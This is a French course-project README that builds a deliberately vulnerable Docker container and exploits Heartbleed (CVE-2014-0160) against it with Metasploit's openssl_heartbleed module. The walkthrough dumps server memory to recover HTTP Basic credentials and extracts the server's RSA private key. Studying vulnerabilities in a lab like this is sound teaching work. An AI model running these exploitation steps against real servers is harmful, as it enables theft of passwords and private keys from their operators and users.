# Introduction à la sécurité des systèmes d'informations

## Equipe

* Guillaume MALLET
* Tom RUSSELLO
* Vincent TAVERNIER

## Faille choisie

CVE-2014-0160 : OpenSSL Heartbeat extension implementation, dite *Heartbleed*.

Versions vulnérables : OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable
(http://heartbleed.com/).

## Références

* http://heartbleed.com/
* https://xkcd.com/1354/

## Préparation de l'environnement

```bash
# Création de l'image Docker utilisant des composants vulnérables
sudo docker build -t cysec-heartbleed .

# Démarrage d'un conteneur utilisant l'image construite
sudo docker run --name cysec-heartbleed -it cysec-heartbleed

# Inspection du réseau bridge : l'adresse IP du conteneur cysec-heartbleed doit
# y apparaître, par défaut sur le sous-réseau 172.17.0.0/24.
# On suppose pour la suite que cette adresse est 172.17.0.2
docker network inspect bridge

# Affichage du site "vulnérable" dans le navigateur
firefox https://172.17.0.2

# Login et mot de passe pour l'authentification HTTP Basic
guest
guest123

# La page d'accueil du site doit être affichée :-)
```

## Exploitation de la faille Hearbleed

### Environnement d'exploitation

```bash
# Installations des paquets nécessaires pour metasploit (exemple sous Debian)
sudo apt-get install git-core postgresql curl ruby-dev nmap gem
gem install wirble sqlite3 bundler
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit*
bundle install

# Démarrage de la console metasploit
./msfconsole

# Utilisation de l'exploit Heartbleed
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 172.17.0.2 # Addresse IP du conteneur vulnérable
set RPORT 443         # Port HTTPS du conteneur vulnérable
```

### Exploit 1 : vol de mot de passe HTTP basic

```bash
# Dans la console metasploit ouverte précédemment
set VERBOSE true
set ACTION DUMP
grep 'guest*' run

# Si la sortie de cette commande est non-vide, il s'agit du bloc de mémoire qui
# a fui du serveur, et qui contient "guest:[mot de passe guest]". Nous avons
# donc récupéré le mot de passe de l'utilisateur guest.

# Si la sortie de cette commande est vide, l'identifiant de guest est absent de
# la mémoire qui a été récupérée. Effectuez encore quelques requêtes avec votre
# navigateur (ou curl) puis réessayez.
```

### Exploit 2 : récupération de la clé privée

```bash
# Dans la console metasploit ouverte précédemment
set VERBOSE true
set ACTION KEYS
run

# Cette commande effectue plusieurs tentatives pour récupérer la clé privée
# associée au certificat utilisé pour la session SSL. Si la récupération
# réussit, la clé privée (au format PEM, "BEGIN RSA PRIVATE KEY") doit être
# affichée dans la sortie. Elle est aussi stockée dans le fichier mentionné
# juste en dessous dans la sortie de la commande run.

[*] 172.17.0.2:443 - Private key stored in /home/debian/.msf4/loot/...

# Déplaçons ce fichier vers "priv.key"
cp /home/debian/.msf4/loot/... priv.key

# Testons qu'il s'agit bien de la clé privée associée à la clé publique du certificat

# Un simple message
echo 'Hi Alice! This is my secret HTTPS request!' >message.txt

# Chiffré avec la clé publique
openssl rsautl -encrypt -pubin -inkey cert.pub >message.encrypted <message.txt

# Déchiffré avec la clé privée extraite grâce à Heartbleed
openssl rsautl -decrypt -inkey priv.key <message.encrypted

```
